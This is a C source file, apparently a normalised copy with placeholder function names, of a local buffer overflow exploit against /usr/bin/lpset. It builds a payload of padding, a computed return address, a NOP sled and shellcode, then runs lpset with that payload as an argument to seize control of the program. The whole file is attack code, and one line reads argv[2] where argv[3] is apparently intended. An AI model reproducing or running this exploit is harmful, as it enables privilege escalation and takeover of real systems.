#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (char*,char*,char*,char*,char*,char*,char*,int /*<<< orphan*/ *) ; 
 long FUNC1 () ; 
 int /*<<< orphan*/  FUNC2 (char*,long) ; 
 char* shellcode ; 
 size_t FUNC3 (char*) ; 
 void* FUNC4 (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 

int FUNC5 (int argc, char *argv[]) {
 
    long offset=410;
    int nop=64;
    int gab=40;
    long addr;
    char buffer[210];
    int i, a, b;   

if (argc > 1) offset = FUNC4(argv[1], NULL, 0);
if (argc > 2) gab = FUNC4(argv[2], NULL, 0);
if (argc > 3) nop = FUNC4(argv[2], NULL, 0);
 
   for (a = 0; a <gab; a++)
        buffer[a] = 'A';
 
  addr = FUNC1() + offset;
 
  buffer[a++] = addr & 0x000000ff;
  buffer[a++] = (addr & 0x0000ff00) >> 8;  
  buffer[a++] = (addr & 0x00ff0000) >> 16;
  buffer[a++] = (addr & 0xff000000) >> 24;
 
  for ( ; a < nop; a++)
    buffer[a] = 0x90;
    
  for (b = 0; b < FUNC3(shellcode); b++, a++)
    buffer[a] = shellcode[b];
    
  buffer[FUNC3(buffer)] = '\0';

        FUNC2("addr = 0x%x\n", addr);
        FUNC0("/usr/bin/lpset", "lpset", "-n", "fns", "-r", buffer,"digit", NULL);
   
}